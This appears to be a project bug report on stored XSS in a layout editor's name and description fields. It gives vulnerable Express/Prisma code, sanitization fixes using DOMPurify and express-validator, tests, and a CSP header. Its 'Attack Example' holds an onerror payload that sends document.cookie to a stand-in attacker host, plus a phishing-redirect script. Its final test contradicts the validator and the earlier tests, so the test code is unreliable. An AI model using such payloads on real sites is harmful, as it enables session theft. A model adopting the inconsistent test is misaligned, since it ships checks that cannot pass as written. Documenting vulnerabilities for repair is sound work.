# BUG-011: Missing Input Sanitization

## Severity Level
**MEDIUM**

## File Location
- `backend/src/handlers/layouts.ts` (lines 30-60)
- `frontend/components/LayoutEditor.tsx` (lines 120-150)

## Description

User input for table and layout names is stored without proper HTML sanitization. This could lead to stored XSS attacks if malicious scripts are embedded in names and later rendered in the UI.

## Current Vulnerable Code

```typescript
// backend/src/handlers/layouts.ts - Line 30-60
router.post('/layouts', async (req, res) => {
  // BUG: No sanitization of user input
  const { name, description } = req.body;
  
  const layout = await prisma.layout.create({
    data: {
      name,  // Stored as-is, could contain malicious content
      description,  // No sanitization
      config: req.body.config,
    },
  });
  
  res.json(layout);
});

router.put('/layouts/:id', async (req, res) => {
  const { name } = req.body;
  
  const layout = await prisma.layout.update({
    where: { id: req.params.id },
    data: {
      name,  // BUG: No sanitization on update either
    },
  });
  
  res.json(layout);
});
```

```tsx
// LayoutEditor.tsx - Line 120-150
const handleSave = async () => {
  // BUG: Sending unsanitized input to API
  await saveLayout({
    name: layoutName,  // Could be: '<script>alert("xss")</script>'
    description: layoutDescription,
  });
};
```

## Attack Example

```javascript
// Attacker creates a layout with malicious name
const maliciousPayload = {
  name: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">',
  description: '<script>window.location="https://phishing-site.com"</script>',
};

// When rendered in admin panel:
// <div class="layout-name">
//   <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
// </div>
// Script executes when image fails to load!
```

## Root Cause Analysis

1. **No Validation Layer**: Input validation middleware missing
2. **Trusting Client Input**: Backend doesn't sanitize before storage
3. **No Output Encoding**: Frontend renders raw HTML from database

## Impact/Consequences

| Impact | Severity | Description |
|--------|----------|-------------|
| Stored XSS | HIGH | Persistent attack vector |
| Session Hijacking | HIGH | Can steal user cookies |
| Phishing | MEDIUM | Can redirect users |
| Data Theft | MEDIUM | Can exfiltrate sensitive data |

## Suggested Fix

### Option 1: DOMPurify + Validator (Recommended)

```typescript
// backend/src/utils/sanitization.ts
import DOMPurify from 'isomorphic-dompurify';
import validator from 'validator';

export const sanitizeHtml = (input: string): string => {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [],  // No HTML allowed in names
    ALLOWED_ATTR: [],
  });
};

export const sanitizeLayoutInput = (input: any) => {
  return {
    name: sanitizeHtml(input.name || ''),
    description: sanitizeHtml(input.description || ''),
    // Validate config separately
    config: validateConfig(input.config),
  };
};

export const validateLayoutName = (name: string): boolean => {
  return (
    validator.isLength(name, { min: 1, max: 100 }) &&
    validator.matches(name, /^[a-zA-Z0-9\s\-_]+$/)  // Alphanumeric + spaces, hyphens, underscores
  );
};
```

```typescript
// backend/src/handlers/layouts.ts - Fixed
import { sanitizeLayoutInput, validateLayoutName } from '../utils/sanitization';

router.post('/layouts', async (req, res) => {
  const sanitized = sanitizeLayoutInput(req.body);
  
  if (!validateLayoutName(sanitized.name)) {
    return res.status(400).json({
      error: 'Invalid layout name. Use 1-100 characters: letters, numbers, spaces, hyphens, underscores.',
    });
  }
  
  const layout = await prisma.layout.create({
    data: sanitized,
  });
  
  res.json(layout);
});

router.put('/layouts/:id', async (req, res) => {
  const sanitized = sanitizeLayoutInput(req.body);
  
  if (!validateLayoutName(sanitized.name)) {
    return res.status(400).json({
      error: 'Invalid layout name',
    });
  }
  
  const layout = await prisma.layout.update({
    where: { id: req.params.id },
    data: sanitized,
  });
  
  res.json(layout);
});
```

### Option 2: Express-Validator Middleware

```typescript
// backend/src/middleware/validation.ts
import { body, validationResult } from 'express-validator';

export const layoutValidationRules = [
  body('name')
    .trim()
    .isLength({ min: 1, max: 100 })
    .withMessage('Name must be 1-100 characters')
    .matches(/^[a-zA-Z0-9\s\-_]+$/)
    .withMessage('Name contains invalid characters')
    .escape(),  // Converts HTML special characters
  
  body('description')
    .optional()
    .trim()
    .isLength({ max: 500 })
    .escape(),
];

export const validate = (req: Request, res: Response, next: NextFunction) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      error: 'Validation failed',
      details: errors.array(),
    });
  }
  next();
};
```

```typescript
// backend/src/handlers/layouts.ts - With middleware
import { layoutValidationRules, validate } from '../middleware/validation';

router.post('/layouts', layoutValidationRules, validate, async (req, res) => {
  // Input is now sanitized and validated
  const layout = await prisma.layout.create({
    data: req.body,
  });
  res.json(layout);
});
```

### Option 3: Frontend Sanitization (Defense in Depth)

```tsx
// frontend/utils/sanitization.ts
import DOMPurify from 'dompurify';

export const sanitizeInput = (input: string): string => {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
};

export const validateLayoutName = (name: string): string | null => {
  if (!name || name.trim().length === 0) {
    return 'Name is required';
  }
  if (name.length > 100) {
    return 'Name must be 100 characters or less';
  }
  if (!/^[a-zA-Z0-9\s\-_]+$/.test(name)) {
    return 'Name can only contain letters, numbers, spaces, hyphens, and underscores';
  }
  return null;
};
```

```tsx
// LayoutEditor.tsx - Fixed
const handleSave = async () => {
  // Sanitize before sending
  const sanitizedName = sanitizeInput(layoutName);
  const sanitizedDescription = sanitizeInput(layoutDescription);
  
  // Validate
  const validationError = validateLayoutName(sanitizedName);
  if (validationError) {
    setError(validationError);
    return;
  }
  
  await saveLayout({
    name: sanitizedName,
    description: sanitizedDescription,
  });
};
```

## Testing Strategy

```typescript
// sanitization.test.ts
describe('Input Sanitization', () => {
  it('should remove script tags from input', () => {
    const input = '<script>alert("xss")</script>Hello';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).toBe('Hello');
  });
  
  it('should remove event handlers', () => {
    const input = '<img src=x onerror="alert(\'xss\')">';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).not.toContain('onerror');
  });
  
  it('should validate layout name format', () => {
    expect(validateLayoutName('Valid Name 123')).toBeNull();
    expect(validateLayoutName('')).toBe('Name is required');
    expect(validateLayoutName('a'.repeat(101))).toContain('100 characters');
    expect(validateLayoutName('Name<script>')).toContain('invalid characters');
  });
  
  it('should reject malicious input at API level', async () => {
    const response = await request(app)
      .post('/api/layouts')
      .send({
        name: '<script>alert("xss")</script>',
      })
      .expect(400);
    
    expect(response.body.error).toBeDefined();
  });
  
  it('should escape special characters in output', async () => {
    const response = await request(app)
      .post('/api/layouts')
      .send({ name: 'Test & Debug <script>' })
      .expect(201);
    
    // Should be escaped, not rejected
    expect(response.body.name).toBe('Test & Debug <script>');
  });
});
```

## Content Security Policy

```typescript
// Add CSP headers as additional protection
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

## Estimated Effort to Fix

| Task | Effort |
|------|--------|
| Install sanitization libraries | 15 min |
| Create sanitization utilities | 1 hour |
| Apply to all endpoints | 1 hour |
| Add frontend validation | 1 hour |
| Testing | 1 hour |
| **Total** | **4.25 hours** |

## Related Issues

- [BUG-010: No Rate Limiting](./BUG-010-no-rate-limiting.md)
- [Security Vulnerabilities](../../docs/security-vulnerabilities.md)

## Fix Status
- **Status**: Open
- **Assigned To**: Unassigned
- **Target Release**: v1.3.0
